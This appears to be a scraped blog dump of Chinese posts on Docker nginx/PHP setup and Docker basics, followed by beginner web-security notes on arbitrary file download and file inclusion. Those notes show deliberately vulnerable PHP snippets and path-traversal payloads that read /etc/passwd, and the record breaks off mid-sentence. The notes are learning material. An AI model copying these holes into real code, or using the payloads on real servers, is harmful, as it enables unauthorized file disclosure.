![img](https://i-blog.csdnimg.cn/direct/ea794c90f3534fc38b8fbc5a1e57fa5e.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n## 删除辅助容器\n\n```bash\n#加上-f就不用先停止容器\ndocker rm -f $(docker ps -aq)\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n## 创建新容器\n\n### nginx：\n\n```bash\ndocker run \\\n-d --name nginx \\\n-p 80:80 \\\n-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \\\n-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \\\n-v /data/nginx/log:/var/log/nginx \\\n-v /data/www:/usr/share/nginx/www \\\n--network mynet \\\nnginx\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n> \\1.    我新建了初始页面目录/usr/share/nginx/www（原本的初始页面目录为/usr/share        /nginx/html）,将它挂载到我们创建好的工作目录/data/www下\n>\n> \n>\n> \\2.    配置文件一定要正确挂载\n>\n> \n>\n> \\3.    --network表示加入自己创建的网络mynet\n\n### php：\n\n```bash\ndocker run \\\n-d --name php \\\n-p 9000:9000 \\\n-v /data/php/php.ini:/usr/local/etc/php/php.ini \\\n-v /data/www:/usr/share/nginx/www \\\n--network mynet \\\nphp:7.3-fpm\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n> \\1.    php和nginx的初始页面必须挂载到同一路径\n>\n> ​      所以在php和nginx的容器内都新建了/usr/share/nginx/www\n>\n> \n>\n> \\2.    --network表示加入自己创建的网络mynet\n\n## 修改配置文件\n\n### 修改default.conf\n\n```bash\n#原本的default.conf\nserver {\n    listen       80;\n    listen  [::]:80;\n    server_name  localhost;\n\n    #access_log  /var/log/nginx/host.access.log  main;\n\n    location / {\n        root   /usr/share/nginx/html;\n        index  index.html index.htm;\n    }\n\n    #error_page  404              /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        root   /usr/share/nginx/html;\n    }\n\n    # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n    #\n    #location ~ \\.php$ {\n    #    proxy_pass   http://127.0.0.1;\n    #}\n\n    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n    #\n    #location ~ \\.php$ {\n    #    root           html;\n    #    fastcgi_pass   127.0.0.1:9000;\n    #    fastcgi_index  index.php;\n    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n    #    include        fastcgi_params;\n    #}\n\n    # deny access to .htaccess files, if Apache's document root\n    # concurs with nginx's one\n    #\n    #location ~ /\\.ht {\n    #    deny  all;\n    #}\n}\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n> 我们需要更改：\n>\n> 1. 将root改为之前设置的初始页面路径/usr/share/nginx/www\n> 2. 在location \\块中，index中增加index.php\n> 3. 将location ~ \\.php$块中的fastcgi_pass改成 php容器名:9000\n> 4. fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n\n```bash\n#修改后的default.conf\nserver {\n    listen       80;\n    listen  [::]:80;\n    server_name  localhost;\n\n    #access_log  /var/log/nginx/host.access.log  main;\n    root /usr/share/nginx/www;\n    location / {\n        # root   /usr/share/nginx/html;\n        # index  index.html index.htm;\n        index index.php index.html;\n    }\n\n    #error_page  404              /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        # root   /usr/share/nginx/html;\n    }\n\n    # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n    #\n    #location ~ \\.php$ {\n    #    proxy_pass   http://127.0.0.1;\n    #}\n\n    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n    #\n    location ~ \\.php$ {\n    #    root           html;\n       fastcgi_pass   php:9000;\n       fastcgi_index  index.php;\n    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n       include        fastcgi_params;\n    }\n\n    # deny access to .htaccess files, if Apache's document root\n    # concurs with nginx's one\n    #\n    #location ~ /\\.ht {\n    #    deny  all;\n    #}\n}\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n### 修改nginx.conf\n\n在http块中把default.conf的内容复制进去\n\n```bash\n#nginx.conf\n\nuser  nginx;\nworker_processes  auto;\n\nerror_log  /var/log/nginx/error.log notice;\npid        /var/run/nginx.pid;\n\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       /etc/nginx/mime.types;\n    default_type  application/octet-stream;\n\n    log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n                      '$status $body_bytes_sent \"$http_referer\" '\n                      '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n    include /etc/nginx/conf.d/*.conf;\n\n    server {\n    listen       80;\n    listen  [::]:80;\n    server_name  localhost;\n\n    #access_log  /var/log/nginx/host.access.log  main;\n    root /usr/share/nginx/www;\n    location / {\n        # root   /usr/share/nginx/html;\n        # index  index.html index.htm;\n        index index.php index.html;\n        try_files $uri $uri/ /info.php?$query_string;\n    }\n\n    #error_page  404              /404.html;\n\n    # redirect server error pages to the static page /50x.html\n    #\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n        # root   /usr/share/nginx/html;\n    }\n\n    # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n    #\n    #location ~ \\.php$ {\n    #    proxy_pass   http://127.0.0.1;\n    #}\n\n    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n    #\n    location ~ \\.php$ {\n    #    root           html;\n       fastcgi_pass   php:9000;\n       fastcgi_index  index.php;\n    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n        access_log /var/log/nginx/fastcgi.log main;\n        include        fastcgi_params;\n    }\n\n    # deny access to .htaccess files, if Apache's document root\n    # concurs with nginx's one\n    #\n    #location ~ /\\.ht {\n    #    deny  all;\n    #}\n}\n}\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n## 测试\n\n### 目录挂载与端口映射\n\nvscode打开/data/www/index.html\n\n随便写点html进去\n\n```html\n<!DOCTYPE html>\n<html>\n\n<head>\n        <title>the nginx's page made by my index.html!</title>\n        <style>\n                html {\n                        color-scheme: light dark;\n                }\n\n                body {\n                        width: 35em;\n                        margin: 0 auto;\n                        font-family: Tahoma, Verdana, Arial, sans-serif;\n                }\n        </style>\n</head>\n\n<body>\n        <h1>the nginx's page made by my index.html!</h1>\n        <p>If you see this page, the nginx web server is successfully installed and\n                working. Further configuration is required.</p>\n\n        <p>For online documentation and support please refer to\n                <a href=\"http://bilibili.com/\">bilibili</a>.<br />\n                Commercial support is available at\n                <a href=\"http://bilibili.com/\">bilibili.com</a>.\n        </p>\n\n        <p><em>Thank you for using nginx.</em></p>\n</body>\n\n</html>\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n ![img](https://i-blog.csdnimg.cn/direct/6c348d0957274362ae8b0ecce031ce69.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n若正常显示，证明目录挂载没有出错\n\n如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html\n\n### 检查php能否被解析\n\n创建index.php，写入\n\n```php\n<?php phpinfo();?>\n```\n\n![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n> 如果在浏览器中输入：\n>\n> http://你的dockerhost的ip:nginx端口/index.php\n\n有以下结果\n\n![img](https://i-blog.csdnimg.cn/direct/cd650e06db7f413493b5800385b30e3b.png)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑\n\n证明配置成功\n\n# 出现的问题以及解决\n\n> 1. nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了\n> 2. 环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：**先查看nginx的日志**看一看有没有报错，然后**检查default.conf和nginx.conf**有没有错误，看一下location /块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n\n# 最后\n\n因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；\n\n因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正\n\n写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)","tags":["PHP","Docker","Nginx"],"categories":["Docker"]},{"title":"Docker","url":"/2025/01/06/docker/","content":"\n# 初识Docker\n\n环境为Ubuntu\n\n![image-20250106154457088](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250106154457088.png)\n\ndocker就是用于解决软件跨环境迁移的问题，docker简单来说就是装了软件及其运行环境的容器\n\n![image-20250106154451211](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250106154451211.png)\n\n![image-20250106155241251](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250106155241251.png)\n\nps:md,docker好几个源都不好用，我的/etc/docker/daemon.json配置如下\n\n```JSON\n/*配置如下*/\n{\n  \"registry-mirrors\": [\n    \"https://hub.fast360.xyz\",\n    \"https://hub.rat.dev\",\n    \"https://hub.littlediary.cn\",\n    \"https://docker.kejilion.pro\",\n    \"https://dockerpull.cn\",\n    \"https://docker-0.unsee.tech\",\n    \"https://docker.tbedu.top\",\n    \"https://docker.1panelproxy.com\",\n    \"https://docker.melikeme.cn\",\n    \"https://cr.laoyou.ip-ddns.com\",\n    \"https://hub.firefly.store\",\n    \"https://docker.hlmirror.com\",\n    \"https://docker.m.daocloud.io\",\n    \"https://docker.1panel.live\",\n    \"https://image.cloudlayer.icu\",\n    \"https://docker.1ms.run\"\n  ],\n  \"insecure-registries\": [],\n  \"debug\": false,\n  \"experimental\": false,\n  \"features\": {\n    \"buildkit\": true\n  },\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\n    \"max-size\": \"10m\",\n    \"max-file\": \"3\"\n  }\n}\n```\n\n\n\n# Docker架构与容器化\n\n![image-20250106154444577](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250106154444577.png)\n\n![image-20250106154436075](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250106154436075.png)\n\n比如想在docker主机上运行MySQL，在docker客户机上拉取MySQL镜像（`docker pull MySQL`），然后docker主机就会在应用市场/仓库中下载MySQL镜像；\n\n客户机上运行MySQL，执行run命令(`docker run MySQL`)，就会创建容器，容器中放着一个或者多个应用\n\n![image-20250106154423878](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250106154423878.png)\n\n也可以制作自己的镜像，`docker build xxx`,会放在docker主机的image中，也可以将这个镜像上传到应用市场中，\n\n`docker push xxx`\n\n# 命令\n\n## 命令-镜像操作\n\n![image-20250108101132008](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108101132008.png)\n\n\n\neg：下载一个nginx\n\n先查看仓库中有没有nginx的镜像，`sudo docker search nginx`（search不走配置的镜像源所以会超时，在镜像名前加上 `register.liberx.info/`可以解决超时问题）\n\n然后拉到docker主机，`sudo docker pull nginx`,pull默认是下载最新版本，下载指定版本`nginx:版本号`\n\n\n\n查看自己的镜像列表：`sudo docker images`/`sudo docker image ls`\n\n## 命令-容器操作\n\n![image-20250108154811893](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108154811893.png)\n\n查看运行中/所有容器： `sudo docker ps [-a]`加上-a就会显示所有容器\n\n![image-20250108155909075](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108155909075.png)\n\nUP表示上线，EXITED表示结束运行\n\n`sudo docker start/stop/stats`后面加的是容器名字或者容器的id（id不一定全部输完只要能区分就行，但是名字不能模糊匹配）\n\n![image-20250108160337579](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108160337579.png)\n\n删除容器：`sudo docker rm [-f] 容器名/容器id`，不加-f那么需要停止容器再删除，-f表示强制删除\n\n可以用$传入id\n\n`sudo docker rm -f $(sudo docker ps -aq)` -aq是显示所有容器的ID\n\n## 命令-run，exec\n\n运行的docker容器名字一坨，一run就阻塞终端，怎么办？\n\n`sudo docker run -d --name 想要指定的容器名 镜像名`\n\n![image-20250108162414930](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108162414930.png)\n\n-d表示后台运行，--name（`是两个杠`）给容器指定一个名字\n\n\n\n既然占用80端口了，计网里学的80是web服务端口，那么想必可以可以用浏览器访问吧\n\n![image-20250108161845673](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108161845673.png)\n\n虽然nginx运行了，还占用的80端口（web服务默认端口），但是在浏览器直接访问docker host的ip行不通\n\n![image-20250108161953081](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108161953081.png)\n\n为什么会这样呢？\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108174937249.png\" alt=\"image-20250108174937249\" style=\"zoom:50%;\" />\n\n原因是占用的80端口只是容器的80端口而不是主机的80端口（前面说的容器就像一个更简化的虚拟机，内部的端口自然与外部主机的端口不一样），所以我们需要进行端口映射\n\n`-p 外部端口:内部端口`（非常重要！！！！！）\n\n![image-20250108174845876](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108174845876.png)\n\n将主机的80端口映射到容器的80端口\n\n这下访问到nginx的主页了\n\n![image-20250108174620804](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108174620804.png)\n\n怎么修改默认的这个页面呢？dockerhub中会描述镜像的默认初始页面（usr/share/nginx/html）（我上不去啊）\n\n`sudo docker exec -it 容器名 /bin/bash ` -it表示交互模式，/bin/bash表示以终端方式进入这个容器\n\n![image-20250108175646271](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108175646271.png)\n\nexit退出\n\n## 命令-镜像操作\n\n![image-20250108225805297](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108225805297.png)\n\n`sudo docker commit [选项] 选定容器 镜像`\n\n```\n-a, --author：设置镜像作者信息。\n-c, --change：应用 Dockerfile 指令来创建镜像。\n-m, --message：提交时的说明信息。\n-p, --pause：在提交之前暂停容器的运行（默认为 true）\n```\n\n比如将前面的运行nginx的容器提交为新镜像\n\n`sudo docker commit -m \"commit-test\" -a \"wwwtty\" myNginx committest`\n\n![image-20250108232458971](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108232458971.png)\n\n镜像保存为一个tar文件\n\n`sudo docker save [-o 文件名.tar] 镜像名`\n\n`sudo docker load -i tar包名字`\n\nload下来后就是一个镜像，直接run就可以启动容器\n\n![image-20250108234044536](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250108234044536.png)\n\n\n\n![image-20250109092226760](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250109092226760.png)\n\n`sudo docker login`\n\n需要有dockerhub账号\n\n`sudo docker tag 原镜像名 目标镜像名`\n\n`sudo docker push 目标镜像名`\n\n# 存储\n\n容器内部对文件修改困难（没有vi/vim），而且如果容器炸了或者容器重新启动就丢失修改\n\n## 目录挂载\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250109100032943.png\" alt=\"image-20250109100032943\" style=\"zoom:50%;\" />\n\n外部的目录像u盘一样 `-v 外部目录:内部目录`\n\n比如将~下的html目录作为外部目录,nginx默认页面所在目录作为内部目录\n\n`sudo docker run -d --name test -p 80:80 -v ~/html:/usr/share/nginx/html nginx`\n\n这样访问服务器ip出来的就是自己预设的页面\n\n## 卷映射\n\n如果想通过修改外部文件就能实现对内部配置文件的修改，需要使用卷映射\n\n为什么不能使用目录挂载呢，因为目录挂载如果目录不存在，会先在外部创建一个空文件夹，那么挂载空文件夹，相当于启动时配置项全是空的，就启动不了容器\n\n`-v 卷名:容器中配置文件路径`\n\n卷的位置 `/var/docker/volumes/卷名`\n\n显示所有的卷：`sudo docker volume ls`\n\n创建卷：`sudo docker volume create 卷名`\n\n显示卷的详细信息：`sudo docker volume inspect 卷名`\n\n# 网络\n\n### 容器间访问\n\n怎么实现一个容器访问另一个容器？\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250109213024273.png\" alt=\"image-20250109213024273\" style=\"zoom:67%;\" />\n\n\n\n1.可以通过run的-v端口映射\n\n我有以下两个run起来的容器\n\n![image-20250109214140742](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250109214140742.png)\n\n假设从test1访问test\n\n `sudo docker exec -it test1 bash `\n\n`sudo curl 175.27.249.106:80` \n\n终端就会出现html\n\n![image-20250109215823532](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250109215823532.png)\n\n但是这样做很奇怪，相当于从test1的88端口->docker host的80端口->test的80端口，绕了一大圈\n\n\n\n有一个叫做docker0的默认网络\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111130916309.png\" alt=\"image-20250111130916309\" style=\"zoom:50%;\" />\n\n![image-20250111131302142](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111131302142.png)\n\n查看容器细节：`sudo docker container inspect 容器名/sudo docker inspect 容器名`\n\n![image-20250111131535673](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111131535673.png)\n\n接下来就可以通过显示出的IP地址进行访问（docker为每个容器分配唯一IP，通过ip+容器端口可以互相访问）\n\n从test0访问test1\n\n![image-20250111134146225](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111134146225.png)\n\n```bash\nubuntu@VM-0-9-ubuntu:~$ sudo docker exec -it test0 bash\nroot@8656267b120d:/# curl http://172.17.0.3:80 #test1容器的ip和端口\n```\n\n![image-20250111134308203](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111134308203.png)\n\n这样做也有缺点，ip是会变动的\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111135401345.png\" alt=\"image-20250111135401345\" style=\"zoom:50%;\" />\n\n### 创建自定义网络\n\n![image-20250111135647105](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111135647105.png)\n\n创建mynet：`sudo docker network create mynet`\n\n![image-20250111135958433](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111135958433.png)\n\n将容器加入自己的网络下（--network 网络名） `sudo docker run -d --name test0 -p 80:80 --network mynet nginx`\n\n`sudo docker inspect test0`:\n\n![image-20250111142033529](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111142033529.png)\n\n这样一来，容器间访问只需要进入容器->`curl http://容器名:容器端口`\n\n# Docker compose\n\n![image-20250111222853028](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250111222853028.png)\n\n![image-20250112104417975](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250112104417975.png)\n\n上线：第一次创建并启动\n\n下线：移除创建的容器以及相关资源\n\n不用compose.yaml启动wordpress和mysql\n\n```bash\n#启动mysql\ndocker run -d -p 3306:3306 \\\n-e MYSQL_ROOT_PASSWORD=123456 \\\n-e MYSQL_DATABASE=wordpress \\\n-v mysql-data:/var/lib/mysql \\\n-v /app/myconf:/etc/mysql/conf.d \\\n--restart always --name mysql \\\n--network blog \\\nmysql:8.0\n\n#启动wordpress\ndocker run -d -p 8080:80 \\\n-e WORDPRESS_DB_HOST=mysql \\\n-e WORDPRESS_DB_USER=root \\\n-e WORDPRESS_DB_PASSWORD=123456 \\\n-e WORDPRESS_DB_NAME=wordpress \\\n-v wordpress:/var/www/html \\\n--restart always --name wordpress-app \\\n--network blog \\\nwordpress:latest\n```\n\ncompose.yaml格式：\n\n```yaml\nname:项目名\nservices:\n\t应用名:\n\t\tcontainer_name: 容器名（不指定默认:项目名_应用名）\n\t\tenvironment:\n\t\t\t环境配置（docker run的-e），格式如 - WORDPRESS_DB_HOST=mysql 或 WORDPRESS_DB_HOST: mysql\n\t\tnetworks:\n\t\t\t- 网络名\n\t\tports:\n\t\t\t- \"端口映射\"\n\t\trestart:\n\t\t\talways /……\n\t\tvolumes:\n\t\t\t- 目录挂载或卷映射\nnetworks:\n\t网络名:\n\t\t更详细的配置\nvolumes:\n\t卷名:\n\t\t更详细的配置\n```\n\n启动(上线)命令：`sudo docker compose -f compose.yaml up -d`\n\n-d:后台运行\n\n-f:指定yaml文件\n\n下线命令：`sudo docker compose -f compose.yaml down`\n\n如果更改了compose.yaml文件的配置，重新上线，没有被更改的应用会保持running状态；\n\n下线并不会移除对应的卷\n\n# Dockerfile\n\n## dockerfile制作镜像\n\n![image-20250113092108980](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113092108980.png)\n\n![image-20250113092724389](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113092724389.png)\n\n比如将app.jar打包成镜像\n\n```dockerfile\nFROM openjdk:17\n\nLABEL author=wwwtty\n\nEXPOSE 8080 #容器暴露8080端口\n\nCOPY app.jar /app.jar #容器相当于一个新的操作系统要放在根目录下\n\nENTRYPOINT java -jar app.jar\n#更推荐下面的写法\nENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"]\n```\n\n制作镜像命令：`docker build -f dockerfile -t 镜像名:版本 ./`要指明当前的目录./\n\n\n\n## 镜像分层存储\n\n![image-20250113104704713](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113104704713.png)\n\n![image-20250113104744757](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113104744757.png)\n\n使用`docker history 镜像名`查看容器构建历史（过程自下而上）\n\n也可以使用 `docker image inspect 镜像名`查看更详细的信息\n\n官方的nginx镜像（docker history）：\n\n![image-20250113110758704](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113110758704.png)\n\n（docker image inspect）展现的层级:\n\n![image-20250113111333347](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113111333347.png)\n\n进行目录挂载后的容器再commit的镜像：\n\n![image-20250113111013688](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113111013688.png)\n\n发现多了1.09kb\n\n（docker image inspect）展现的层级:\n\n![image-20250113111401460](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113111401460.png)\n\n比官方的多了一层，多的一层就是挂载的目录\n\n分层视角下的容器与镜像\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113111738899.png\" alt=\"image-20250113111738899\" style=\"zoom: 25%;\" />\n\n容器就是在镜像层（只读）加上一层读写层，对容器的修改都是在可读可写层进行，所以删除容器修改都会丢失（因为读写层没了）\n\n这样的好处是容器隔离：\n\n![image-20250113112037023](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113112037023.png)\n\n可以用 `docker ps -s/--size` 查看读写层和只读层的关系\n\n![image-20250113112611189](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250113112611189.png)\n\nSIZE列 前面是读写层大小括号内是镜像大小\n\n","tags":["Docker"],"categories":["Docker"]},{"title":"任意文件下载漏洞学习笔记","url":"/2024/10/14/任意文件下载/","content":"\n# 前言\n\n本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~\n\n参考：https://blog.csdn.net/qq_43531669/article/details/116865660\n\n# 什么是任意文件下载/读取？\n\n任意文件读取/下载漏洞（Arbitrary File Read/Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。\n\n这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。\n\n这里以 Pikachu 靶场的 unsafe filedownload 模块为例：\n\n\n下载文件后复制下载链接\n\n得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png\n\nfilename通过GET方法传入后端\n\n直接看代码\n\n![image-20241014214821984](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241014214821984.png)\n\nfilename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载/读取漏洞\n\n\n\n# 1、漏洞利用条件\n\n1. \n\n2. 存在读文件的函数：\n\n    fopen()\n\n    ```php\n    $file = $_GET['file']; // 用户提供的文件路径\n    $fp = fopen($file, 'r'); // 打开文件\n    $data = fread($fp, filesize($file)); // 读取文件内容\n    fclose($fp); // 关闭文件\n    echo $data; // 输出文件内容\n    ```\n\n    fread()\n\n    ```php\n    $file = $_GET['file']; // 用户提供的文件路径\n    $fp = fopen($file, 'r'); // 打开文件\n    $data = fread($fp, 1024); // 读取文件前 1024 字节的内容\n    fclose($fp); // 关闭文件\n    echo $data; // 输出文件内容\n    ```\n\n    include()\n\n    ```php\n    $file = $_GET['file']; // 用户提供的文件路径\n    include($file); // 包含文件并输出内容\n    ```\n\n    readfile()\n\n    ```php\n    $file = $_GET['file']; // 用户提供的文件路径\n    readfile($file); // 读取并输出文件内容\n    ```\n\n    file_get_context()\n\n    ```php\n    $file = $_GET['file']; // 用户提供的文件路径\n    $data = file_get_contents($file); // 读取文件内容\n    echo $data; // 输出文件内容\n    ```\n\n    file()\n\n    ```php\n    $file = $_GET['file']; // 用户提供的文件路径\n    $data = file($file); // 将文件读入数组中\n    echo implode('', $data); // 输出文件内容\n    ```\n\n    2.读取文件的路径用户可控且未校验或校验不严\n\n    3.输出了文件内容\n\n## 漏洞类型\n\n```\nindex.php?f=../../../../../../etc/passwd\n\nindex.php?f=../index.php\n\nindex.php?f=ﬁle:///etc/passwd\n\n```\n\n当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。\n\n","tags":["Web安全","PHP","任意文件下载漏洞"],"categories":["Web安全","任意文件下载漏洞"]},{"title":"任意文件包含漏洞学习笔记","url":"/2024/09/12/文件包含/","content":"\n# 前言\n\n本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~\n\n参考：https://blog.csdn.net/qq_41575340/article/details/91897245\n\n# 什么是文件包含\n\n1.文件包含漏洞概述\n和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。\n\n什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。\n\n有时候由于网站功能需求，要包含的文件是一个变量，那么前端用户就可以进行选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。\n\n以PHP为例,常用的文件包含函数有以下四种\ninclude(),require(),include_once(),require_once()区别如下:\n\n```php\nrequire():找不到被包含的文件会产生致命错误，并停止脚本运行\ninclude():找不到被包含的文件只会产生警告，脚本继续执行\nrequire_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含\ninclude_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含\n```\n例子：在小皮的根目录下放一个test.php里面写上\n\n```php\n<?php include $_GET['test'];?>\n```\n\n在根目录下放另外一个file.php\n\n```php\n<?php phpinfo();?>\n```\n\n构造url,把file.php作为参数传入\n\n```\nhttp://192.168.127.231/test.php?test=file.php\n```\n\n文件包含成功\n\n![image-20240912205935094](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240912205935094.png)\n\n\n\n大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：\n\n# 分类\n\n## 1.本地文件包含漏洞（LFI）\n\n仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击者更多的会包含一些 